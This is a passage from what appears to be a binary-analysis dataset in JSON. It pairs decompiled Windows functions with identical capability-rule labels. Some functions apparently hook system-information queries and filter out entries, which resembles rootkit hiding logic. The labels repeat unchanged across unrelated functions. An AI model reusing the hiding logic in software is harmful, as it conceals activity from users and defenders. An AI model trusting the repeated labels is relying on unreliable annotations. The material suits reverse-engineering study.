*0xb1c5b2d4 * 8) = var_4h;\n            *0xb1c5b2d4 = *0xb1c5b2d4 + 1;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 754
    },
    "0001e320": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0001e320(uint noname_0, uint noname_1, uint arg_10h, uint *arg_14h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (arg_14h != NULL) {\n        *arg_14h = 0;\n    }\n    iVar1 = fcn.00020650(arg_10h, 2, 2, &var_ch, 4);\n    if (iVar1 == 0) {\n        uVar2 = 0x21590065;\n    }\n    else {\n        iVar1 = fcn.00020650(arg_10h, 0x3c, 2, &var_8h, 4);\n        if (iVar1 == 0) {\n            uVar2 = 0x21590066;\n        }\n        else {\n            var_4h = fcn.0001a520(var_ch, var_8h);\n            uVar2 = fcn.000785b6(var_4h);\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 257
    },
    "0001e3e0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0001e3e0(int32_t arg_8h)\n\n{\n    fcn.0001d420(0);\n    fcn.00016cf0(arg_8h == 0);\n    if (arg_8h != 0) {\n        (**(arg_8h + 0x2c))(arg_8h, 0);\n        fcn.00035330(arg_8h);\n    }\n    return 0;\n}\n",
        "token_count": 103
    },
    "0001e460": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0001e460(uint noname_0, uint noname_1, uint arg_10h, uint *arg_14h)\n\n{\n    int32_t iVar1;\n    int32_t var_24h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    uint var_18h;\n    uint var_14h;\n    ushort *var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    *arg_14h = 0;\n    iVar1 = fcn.000205e0(arg_10h, 4, 5, &var_24h, &var_8h);\n    if (iVar1 == 0) {\n        var_4h = 0x21590065;\n    }\n    else {\n        var_4h = fcn.0005bb80(var_24h, var_8h);\n        if (var_4h == 0) {\n            var_18h = fcn.0005b8a0(var_24h);\n            var_20h = fcn.00035230(var_18h);\n            if (var_20h == 0) {\n                var_4h = 0x21590004;\n            }\n            else {\n                fcn.00078790(var_20h, 0, var_18h);\n                var_4h = fcn.0005b980(var_20h, var_24h);\n                if (((var_4h == 0) && (var_4h = fcn.0005b270(var_20h, var_20h),  var_4h == 0)) &&\n                   (var_4h = fcn.0005b480(0, var_20h),  var_4h == 0)) {\n                    var_ch = fcn.00035200(0xa8);\n                    if (var_ch == NULL) {\n                        var_4h = 0x21590004;\n                    }\n                    else {\n                        *(var_ch + 6) = var_20h;\n                        *(var_ch + 8) = var_18h;\n                        *var_ch = 0;\n                        var_ch[1] = 0;\n                        *(var_ch + 10) = var_20h;\n                        *(var_ch + 4) = var_18h;\n                        var_1ch = var_24h + *(var_24h + 0x3c);\n                        *(var_ch + 0x16) = var_20h + *(var_1ch + 0x28);\n                        iVar1 = fcn.0001a8e0(&var_14h, 0xb1beb3e0, var_ch);\n                        if (iVar1 == 0) {\n                            fcn.00037220(&var_14h);\n                        }\n                        var_4h = 0;\n                    }\n                }\n                if (var_4h != 0) {\n                    fcn.00035330(var_20h);\n                }\n            }\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 679
    },
    "0001e5f0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nint32_t fcn.0001e5f0(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t var_4h;\n    \n    if (*0xb1c5a937 != '\\0') {\n        return 0;\n    }\n    uVar2 = 0xb1c5b330;\n    fcn.00036f50(0xb1c5b330);\n    var_4h = fcn.0001b790(uVar2, 0xc0000001);\n    if ((var_4h == 0) &&\n       (var_4h = fcn.000630a0(1, *(*0xb1c59660 + 0xc), 0xb1bde8cc, 0xb1bebda0, 0xb1c5b2f4),  var_4h == 0)) {\n        fcn.00063a90(*0xb1c5b2f4);\n        var_4h = fcn.000630a0(1, *(*0xb1c59660 + 0xc), 0xb1bde8d8, 0xb1bebee0, 0xb1c5b2e8);\n        if (var_4h == 0) {\n            fcn.00063a90(*0xb1c5b2e8);\n            iVar1 = fcn.00034c90();\n            if (0x22 < iVar1) {\n                var_4h = fcn.000630a0(1, *(*0xb1c59660 + 0xc), 0xb1bde8f4, 0xb1bebe80, 0xb1c5b2fc);\n                if (var_4h != 0) goto code_r0x0001e786;\n                fcn.00063a90(*0xb1c5b2fc);\n            }\n            var_4h = fcn.000630a0(1, *(*0xb1c59660 + 0xc), 0xb1bde910, 0xb1bebc30, 0xb1c5b2ec);\n            if (var_4h == 0) {\n                fcn.00063a90(*0xb1c5b2ec);\n                var_4h = fcn.000630a0(1, *(*0xb1c59660 + 0xc), 0xb1bde808, 0xb1bec8c0, 0xb1c5b2f8);\n                if (var_4h == 0) {\n                    fcn.00063a90(*0xb1c5b2f8);\n                    var_4h = fcn.000631a0(*0xb1bde138, 0xb1bebce0, 0xb1c5b2f0);\n                    if (var_4h == 0) {\n                        fcn.00063a90(*0xb1c5b2f0);\n                        *0xb1c5a937 = '\\x01';\n                        var_4h = 0;\n                    }\n                }\n            }\n        }\n    }\ncode_r0x0001e786:\n    if (var_4h != 0) {\n        fcn.0001ea20();\n    }\n    return var_4h;\n}\n",
        "token_count": 753
    },
    "0001e7a0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t fcn.0001e7a0(void)\n\n{\n    int32_t iVar1;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    if (*0xb1c5b344 != '\\0') {\n        return 0;\n    }\n    fcn.000170c0();\n    iVar1 = fcn.00034a80(0xb1bde918, &var_4h);\n    if (iVar1 != 0) {\n        return iVar1;\n    }\n    var_8h = fcn.00063a30(1, var_4h, 0xb1bde924, 0xb1c5b318);\n    if ((((((var_8h == 0) && (var_8h = fcn.00063a30(1, var_4h, 0xb1bde93c, 0xb1c5b320),  var_8h == 0)) &&\n          (var_8h = fcn.00063a30(1, var_4h, 0xb1bde950, 0xb1c5b31c),  var_8h == 0)) &&\n         ((var_8h = fcn.00063a30(1, var_4h, 0xb1bde960, 0xb1c5b30c),  var_8h == 0 &&\n          (var_8h = fcn.00063a30(1, var_4h, 0xb1bde970, 0xb1c5b310),  var_8h == 0)))) &&\n        ((var_8h = fcn.00063a30(1, var_4h, 0xb1bde980, 0xb1c5b314),  var_8h == 0 &&\n         ((var_8h = fcn.00063a30(1, var_4h, 0xb1bde990, 0xb1c5b324),  var_8h == 0 &&\n          (var_8h = fcn.00063a30(1, var_4h, 0xb1bde9a0, 0xb1c5b32c),  var_8h == 0)))))) &&\n       (var_8h = fcn.000630a0(1, var_4h, 0xb1bde990, 0xb1bec6e0, 0xb1c5b304),  var_8h == 0)) {\n        fcn.00063a90(*0xb1c5b304);\n        iVar1 = fcn.00034c90();\n        if (0x1a < iVar1) {\n            var_8h = fcn.000630a0(1, var_4h, 0xb1bde9bc, 0xb1bec790, 0xb1c5b300);\n            if (var_8h != 0) goto code_r0x0001e9c6;\n            fcn.00063a90(*0xb1c5b300);\n        }\n        var_8h = fcn.00063a30(1, var_4h, 0xb1bde9d0, 0xb1c5b328);\n        if ((var_8h == 0) && (var_8h = fcn.000630a0(1, var_4h, 0xb1bde9d0, 0xb1bebb80, 0xb1c5b308),  var_8h == 0)) {\n            fcn.00063a90(*0xb1c5b308);\n            *0xb1c5b344 = '\\x01';\n            var_8h = 0;\n        }\n    }\ncode_r0x0001e9c6:\n    if (var_8h != 0) {\n        fcn.00063a90(*0xb1c5b308);\n        fcn.000635f0(0xb1c5b308);\n        fcn.00063a90(*0xb1c5b300);\n        fcn.000635f0(0xb1c5b300);\n        fcn.00063a90(*0xb1c5b304);\n        fcn.000635f0(0xb1c5b304);\n    }\n    return var_8h;\n}\n",
        "token_count": 991
    },
    "0001eb80": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.0001eb80(uint noname_0, int32_t arg_ch)\n\n{\n    char cVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint32_t extraout_ECX;\n    uint var_9h;\n    \n    if (((arg_ch == 0) || (arg_ch == 1)) || (arg_ch == 2)) {\n        var_9h._0_1_ = (**0xb1bde0c4)();\n        if ((var_9h != 0) &&\n           (cVar1 = (**0xb1bde134)(*(**0xb1bde144 + 0x88), *(**0xb1bde144 + 0x8c), extraout_ECX & 0xffffff00 | var_9h), \n           cVar1 == '\\0')) {\n            return 0xc0000061;\n        }\n        *0xb1c5a936 = 1;\n        iVar3 = fcn.0001a8e0(&var_9h + 1, 0xb1bea420, 0);\n        if (iVar3 == 0) {\n            fcn.00037270(&var_9h + 1, 0);\n            fcn.00037220(&var_9h + 1);\n        }\n        fcn.0006d500();\n        uVar2 = (**0xb1c5b328)(arg_ch);\n    }\n    else {\n        uVar2 = 0xc000000d;\n    }\n    return uVar2;\n}\n",
        "token_count": 353
    },
    "0001ec30": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0001ec30(uint arg_8h, int32_t arg_ch)\n\n{\n    char cVar1;\n    code *pcVar2;\n    uint uVar3;\n    uint var_4h;\n    \n    if (((arg_ch != 0) && (arg_ch != -1)) && (cVar1 = fcn.0001ba30(arg_ch, 1),  cVar1 != '\\0')) {\n        return 0;\n    }\n    if (*0xb1c5a936 == '\\0') {\n        fcn.00019000();\n    }\n    pcVar2 = fcn.000639f0(arg_8h);\n    uVar3 = (*pcVar2)(arg_8h, arg_ch);\n    return uVar3;\n}\n",
        "token_count": 170
    },
    "0001ece0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl\nfcn.0001ece0(uint arg_8h, int32_t arg_ch, uint arg_10h, uint32_t arg_14h, uint arg_18h, uint arg_1ch, uint32_t arg_20h, \n            uint arg_24h)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    code *pcVar3;\n    uint32_t in_EDX;\n    uint *puVar4;\n    uint uVar5;\n    int32_t var_24h;\n    uint var_20h;\n    uint var_18h;\n    uint var_14h;\n    uint *var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    cVar1 = fcn.00032ea0(arg_ch, in_EDX & 0xffffff00 | arg_14h & 0xff, &var_20h, &var_24h);\n    if (cVar1 == '\\0') {\n        uVar2 = arg_20h & 0xffffff00 | arg_14h & 0xff;\n        pcVar3 = fcn.000639f0(arg_8h);\n        var_24h = (*pcVar3)(arg_8h, arg_ch, arg_10h, uVar2, arg_18h, arg_1ch, arg_20h, arg_24h);\n    }\n    else if (var_24h == 0) {\n        var_18h = 0x18;\n        var_14h = 0;\n        var_ch = *(arg_ch + 0xc);\n        var_10h = &var_20h;\n        var_8h = *(arg_ch + 0x10);\n        var_4h = 0;\n        uVar5 = 0;\n        puVar4 = &var_18h;\n        pcVar3 = fcn.000639f0(arg_8h);\n        var_24h = (*pcVar3)(arg_8h, puVar4, arg_10h, uVar5, arg_18h, arg_1ch, arg_20h, arg_24h);\n        fcn.000334e0(&var_20h);\n    }\n    return var_24h;\n}\n",
        "token_count": 505
    },
    "0001ee80": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0001ee80(uint arg_8h, uint arg_ch, int32_t arg_10h, uint32_t *arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint32_t *puVar3;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar2 = arg_10h;\n    puVar3 = arg_14h;\n    pcVar1 = fcn.000639f0(arg_8h);\n    iVar2 = (*pcVar1)(arg_8h, arg_ch, iVar2, puVar3, arg_18h, arg_1ch);\n    if ((iVar2 == 0) && (arg_10h == 0x22)) {\n        *arg_14h = *arg_14h | 0x20;\n    }\n    return iVar2;\n}\n",
        "token_count": 209
    },
    "0001eee0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t fcn.0001eee0(uint param_1, int32_t param_2, uint32_t *param_3, int32_t param_4, int32_t *param_5)\n\n{\n    uint32_t uVar1;\n    bool bVar2;\n    bool bVar3;\n    char cVar4;\n    code *pcVar5;\n    uint uVar6;\n    int32_t iVar7;\n    uint32_t *puVar8;\n    uint32_t *puVar9;\n    uint *in_FS_OFFSET;\n    uint var_8h;\n    int32_t var_ch;\n    uint32_t *var_10h;\n    int32_t var_14h;\n    int32_t *var_18h_2;\n    uint var_18h;\n    int32_t iVar10;\n    int32_t *piVar11;\n    uint var_64h;\n    uint var_5ch;\n    uint32_t var_58h;\n    uint32_t var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint32_t var_48h;\n    uint32_t var_44h;\n    uint var_40h;\n    uint32_t *var_3ch;\n    uint32_t *var_38h;\n    uint32_t *var_34h;\n    int32_t var_30h;\n    int32_t var_29h;\n    int32_t var_24h;\n    int32_t var_1ch;\n    uint var_10h_2;\n    uint uStack16;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0xb1c458a0;\n    uStack16 = 0xb1c4578a;\n    var_10h_2 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_10h_2;\n    var_30h = 0;\n    var_1ch = 0;\n    bVar3 = false;\n    bVar2 = false;\n    iVar7 = var_ch;\n    puVar8 = var_10h;\n    iVar10 = var_14h;\n    piVar11 = var_18h_2;\n    pcVar5 = fcn.000639f0(var_8h);\n    *NULL = (*pcVar5)(var_8h, iVar7, puVar8, iVar10, piVar11);\n    if ((*NULL != 0) || (cVar4 = fcn.0001f620(),  cVar4 != '\\0')) goto code_r0x0001f299;\n    var_4h = 0;\n    cVar4 = (**0xb1bde0c4)();\n    if (cVar4 == '\\0') {\ncode_r0x0001f001:\n        if (var_18h_2 == NULL) {\n            var_24h = var_14h;\n        }\n        else {\n            var_24h = *var_18h_2;\n        }\n        if (var_ch == 5) {\n            var_34h = var_10h;\n            var_3ch = NULL;\n            do {\n                if (*var_34h == 0) {\n                    var_38h = NULL;\n                }\n                else {\n                    var_38h = var_34h + *var_34h;\n                }\n                if ((var_34h[0xf] == 0) || (iVar7 = fcn.0001f480(var_34h[0xf], var_34h[0x11]),  iVar7 == 0)) {\n                    var_3ch = var_34h;\n                }\n                else if (var_3ch == NULL) {\n                    var_3ch = var_34h;\n                }\n                else if (var_38h == NULL) {\n                    *var_3ch = 0;\n                    var_38h = NULL;\n                }\n                else {\n                    *var_3ch = *var_3ch + *var_34h;\n                }\n                var_34h = var_38h;\n            } while (var_38h != NULL);\n        }\n        else if (var_ch == 0x10) {\n            uVar1 = *var_10h;\n            var_48h = 0;\n            for (var_44h = 0; var_44h < uVar1; var_44h = var_44h + 1) {\n                iVar7 = fcn.0001f5e0(var_10h[var_44h * 4 + 3], var_10h[var_44h * 4 + 1], \n                                     *(var_10h + var_44h * 0x10 + 10));\n                if (iVar7 == 0) {\n                    if (var_44h != var_48h) {\n                        puVar9 = var_10h + var_44h * 4 + 1;\n                        puVar8 = var_10h + var_48h * 4 + 1;\n                        *puVar8 = *puVar9;\n                        puVar8[1] = puVar9[1];\n                        puVar8[2] = puVar9[2];\n                        puVar8[3] = puVar9[3];\n                    }\n                    var_48h = var_48h + 1;\n                }\n            }\n            *var_10h = var_48h;\n            var_24h = var_48h * 4 + 4;\n        }\n        else if (var_ch == 0x40) {\n            uVar1 = *var_10h;\n            var_58h = 0;\n            for (var_54h = 0; var_54h < uVar1; var_54h = var_54h + 1) {\n                iVar7 = fcn.0001f5e0(var_10h[var_54h * 7 + 2], var_10h[var_54h * 7 + 3], var_10h[var_54h * 7 + 4]);\n                if (iVar7 == 0) {\n                    if (var_54h != var_58h) {\n                        puVar8 = var_10h + var_54h * 7 + 1;\n                        puVar9 = var_10h + var_58h * 7 + 1;\n                        for (iVar7 = 7; iVar7 != 0; iVar7 = iVar7 + -1) {\n                            *puVar9 = *puVar8;\n                            puVar8 = puVar8 + 1;\n                            puVar9 = puVar9 + 1;\n                        }\n                    }\n                    var_58h = var_58h + 1;\n                }\n            }\n        }\n        if (var_18h_2 != NULL) {\n            *var_18h_2 = var_24h;\n        }\n    }\n    else {\n        if (var_18h_2 != NULL) {\n            var_30h = (**0xb1bde294)(var_18h_2, 4, 0, 0, 0);\n            if (var_30h == 0) {\n                unique0x00007a00 = -0x3fffff66;\n                goto code_r0x0001f299;\n            }\n            uVar6 = (**0xb1bde0c4)(2);\n            (**0xb1bde2a0)(var_30h, uVar6);\n            bVar3 = true;\n        }\n        var_1ch = (**0xb1bde294)(var_10h, var_14h, 0, 0, 0);\n        if (var_1ch != 0) {\n            uVar6 = (**0xb1bde0c4)(2);\n            (**0xb1bde2a0)(var_1ch, uVar6);\n            bVar2 = true;\n            goto code_r0x0001f001;\n        }\n        stack0xffffffd4 = -0x3fffff66;\n    }\n    var_4h = 0xffffffff;\n    if (bVar2) {\n        (**0xb1bde29c)(var_1ch);\n    }\n    if (var_1ch != 0) {\n        (**0xb1bde2ac)(var_1ch);\n    }\n    if (bVar3) {\n        (**0xb1bde29c)(var_30h);\n    }\n    if (var_30h != 0) {\n        (**0xb1bde2ac)(var_30h);\n    }\ncode_r0x0001f299:\n    *in_FS_OFFSET = var_10h_2;\n    return *NULL;\n}\n",
        "token_count": 1916
    },
    "0001f2b0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0001f2b0(uint arg_8h)\n\n{\n    char *pcVar1;\n    int32_t iVar2;\n    uint var_24h;\n    uint var_20h;\n    uint var_18h;\n    char *var_14h;\n    uint var_10h;\n    uint var_8h;\n    char *var_4h;\n    \n    if (*0xb1c5b348 == NULL) {\n        fcn.0002be50(0xb1c59b98, 0x52);\n        var_4h = 0xb1c59b98;\n        pcVar1 = var_4h;\n        do {\n            var_4h = pcVar1;\n            pcVar1 = var_4h + 1;\n        } while (*var_4h != '\\0');\n        *0xb1c5b348 = var_4h + 0x4e3a6468;\n        fcn.0002be80(0xb1c59c98, 0x52);\n        var_14h = 0xb1c59c98;\n        pcVar1 = var_14h;\n        do {\n            var_14h = pcVar1;\n            pcVar1 = var_14h + 1;\n        } while (*var_14h != '\\0');\n        *0xb1c59b94 = var_14h + 0x4e3a6368;\n    }\n    iVar2 = fcn.000785c8(arg_8h, 0xb1c59b98, *0xb1c5b348);\n    if ((iVar2 != 0) && (iVar2 = fcn.000785c8(arg_8h, 0xb1c59c98, *0xb1c59b94),  iVar2 != 0)) {\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 421
    },
    "0001f390": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0001f390(uint arg_8h)\n\n{\n    int16_t *piVar1;\n    int32_t iVar2;\n    uint var_24h;\n    uint var_20h;\n    uint var_18h;\n    int16_t *var_14h;\n    uint var_10h;\n    uint var_8h;\n    int16_t *var_4h;\n    \n    if (*0xb1c5b34c == 0) {\n        fcn.0002beb0(0xb1c59cf0, 0x52);\n        var_4h = 0xb1c59cf0;\n        piVar1 = var_4h;\n        do {\n            var_4h = piVar1;\n            piVar1 = var_4h + 1;\n        } while (*var_4h != 0);\n        *0xb1c5b34c = var_4h + 0x271d3188 >> 1;\n        fcn.0002bee0(0xb1c59bf0, 0x52);\n        var_14h = 0xb1c59bf0;\n        piVar1 = var_14h;\n        do {\n            var_14h = piVar1;\n            piVar1 = var_14h + 1;\n        } while (*var_14h != 0);\n        *0xb1c59bec = var_14h + 0x271d3208 >> 1;\n    }\n    iVar2 = fcn.00036010(arg_8h, 0xb1c59cf0, *0xb1c5b34c);\n    if ((iVar2 != 0) && (iVar2 = fcn.00036010(arg_8h, 0xb1c59bf0, *0xb1c59bec),  iVar2 != 0)) {\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 427
    },
    "0001f480": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0001f480(uint arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t var_114h;\n    uint var_110h;\n    uint32_t var_8h;\n    int32_t var_4h;\n    \n    var_4h = 0;\n    var_114h = fcn.0001f390(arg_8h);\n    if (var_114h == 0) {\n        for (var_8h = 0; var_8h < *0xb1c5b2d4; var_8h = var_8h + 1) {\n            if (*(*0xb1c5b2d8 + var_8h * 8) == arg_ch) {\n                var_4h = *(*0xb1c5b2d8 + 4 + var_8h * 8);\n                break;\n            }\n        }\n        if (*0xb1c5b2d4 <= var_8h) {\n            return 0;\n        }\n    }\n    else {\n        var_4h = *0xb1c5b2e4;\n    }\n    if (var_4h == 1) {\n        var_114h = 1;\n    }\n    else if (var_4h == 0) {\n        var_114h = 0;\n    }\n    else if (var_4h == 2) {\n        var_114h = 0;\n        iVar1 = fcn.00036880(&var_110h, 0x104);\n        if (iVar1 == 0) {\n            var_114h = 1;\n        }\n        else {\n            fcn.00078640(&var_110h);\n            for (var_8h = 0; var_8h < *0xb1c5b2dc; var_8h = var_8h + 1) {\n                iVar1 = fcn.00078646(&var_110h, *(*0xb1c5b2e0 + var_8h * 4));\n                if (iVar1 != 0) {\n                    return 1;\n                }\n            }\n        }\n    }\n    return var_114h;\n}\n",
        "token_count": 493
    },
    "0001f6e0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl\nfcn.0001f6e0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h, \n            uint arg_24h, uint32_t arg_28h)\n\n{\n    uint32_t in_EAX;\n    uint32_t uVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t var_24h;\n    int32_t *var_20h;\n    int32_t var_1ch;\n    uint var_18h;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = in_EAX & 0xffffff00 | arg_28h & 0xff;\n    uVar4 = arg_18h;\n    pcVar2 = fcn.000639f0(arg_8h);\n    var_1ch = (*pcVar2)(arg_8h, arg_ch, arg_10h, arg_14h, uVar4, arg_1ch, arg_20h, arg_24h, uVar1);\n    if (var_1ch == 0) {\n        iVar3 = (**0xb1bde2a4)(arg_18h, 0, 0, 0, &var_24h, 0);\n        if (iVar3 == 0) {\n            var_20h = var_24h + 0x50;\n            if (*(var_24h + 0x54) == *var_20h) {\n                iVar3 = fcn.000785da(arg_18h, 0, &var_18h, 0x18, 0);\n                if (iVar3 == 0) {\n                    fcn.0001fa10(var_4h, var_8h, 1);\n                }\n            }\n            (**0xb1bde2e4)();\n        }\n    }\n    return var_1ch;\n}\n",
        "token_count": 446
    },
    "0001f790": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t fcn.0001f790(uint param_1, uint *param_2, uint param_3, uint param_4, uint param_5, uint param_6, uint param_7, \n                    uint param_8, uint param_9, uint param_10, uint param_11, uint param_12)\n\n{\n    char cVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint var_8h;\n    uint *var_ch;\n    uint var_10h;\n    uint var_14h;\n    uint var_18h_2;\n    uint var_1ch;\n    uint var_20h;\n    uint var_24h;\n    uint var_28h;\n    uint var_2ch;\n    uint var_30h;\n    uint var_18h;\n    uint *puVar4;\n    uint var_3ch;\n    uint var_38h;\n    int32_t var_34h;\n    uint var_30h_2;\n    uint var_20h_2;\n    uint var_1ch_2;\n    uchar *puStack28;\n    uint var_10h_2;\n    uint uStack16;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0xb1c459a0;\n    uStack16 = 0xb1c4578a;\n    var_10h_2 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_10h_2;\n    puStack28 = &stack0xffffffb0;\n    puVar4 = var_ch;\n    pcVar2 = fcn.000639f0(var_8h);\n    var_34h = (*pcVar2)(var_8h, puVar4, var_10h, var_14h, var_18h_2, var_1ch, var_20h, var_24h, var_28h, var_2ch, \n                        var_30h, var_18h);\n    if (var_34h == 0) {\n        cVar1 = (**0xb1bde0c4)();\n        if (cVar1 == '\\0') {\n            var_3ch = *var_ch;\n        }\n        else {\n            var_4h = 0;\n            (**0xb1bde2e0)(var_ch, 4, 1);\n            var_3ch = *var_ch;\n            var_4h = 0xffffffff;\n        }\n        iVar3 = fcn.00034aa0(var_3ch, &var_38h);\n        if (iVar3 == 0) {\n            iVar3 = fcn.000785da(var_38h, 0, &var_30h_2, 0x18, 0);\n            if (iVar3 == 0) {\n                fcn.0001fa10(var_1ch_2, var_20h_2, 1);\n            }\n            fcn.00034af0(var_3ch, var_38h);\n        }\n    }\n    *in_FS_OFFSET = var_10h_2;\n    return var_34h;\n}\n",
        "token_count": 706
    },
    "0001f8c0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_34h\n// WARNING: Variable defined which should be unmapped: var_30h\n// WARNING: Variable defined which should be unmapped: var_2ch\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.0001f8c0(uint arg_8h, uint *arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    uint uVar3;\n    uint *puVar4;\n    uint *arg_8h_00;\n    uint *arg_ch_00;\n    uint *var_34h;\n    uint var_30h;\n    int32_t var_2ch;\n    uint *var_25h;\n    uint var_20h;\n    int32_t var_1ch;\n    uint var_18h;\n    uint var_8h;\n    uint *var_4h;\n    \n    var_25h._0_1_ = '\\0';\n    arg_ch_00 = &var_2ch;\n    iVar1 = fcn.00059c60(0xffffffff, arg_ch_00);\n    if (iVar1 == 0) {\n        var_1ch = *(var_2ch + 0x1c);\n        if (*(var_1ch + 4) < 0x80000000) {\n            if ((*0xb1c5b350 == NULL) || (*0xb1c5b354 == NULL)) {\n                iVar1 = fcn.00034a80(0xb1bde918, &var_20h);\n                if (iVar1 != 0) {\n                    return 0xc0000005;\n                }\n                iVar1 = fcn.0005c850(var_20h, 